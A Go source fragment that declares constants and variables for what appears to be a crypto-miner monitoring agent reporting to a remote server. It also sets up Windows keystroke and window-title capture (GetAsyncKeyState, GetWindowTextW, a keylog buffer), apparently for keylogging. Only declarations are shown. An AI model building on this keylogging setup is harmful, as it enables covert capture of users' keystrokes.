package main

import (
	"time"
	"syscall"
)

const (
	requestTimeOut         = time.Duration(10 * time.Second)
	serverUrl              = "http://dev.miner.eubchain.com:3001"
	apiUploadMachineInfor  = serverUrl + "/machine"
	apiUploadMachineStatus = serverUrl + "/status"
	getOnlineConfig        = serverUrl + "/machine"
	localGetStat           = "http://127.0.0.1:42000/getstat"
)

var (
	// miner process name
	minerprocess = "miner.exe"
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	// procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW = user32.NewProc("GetWindowTextW") //GetWindowTextW
	tmpKeylog string
	tmpTitle  string
	machineName string // add by clk
	updateTime  int64  // add by clk
)
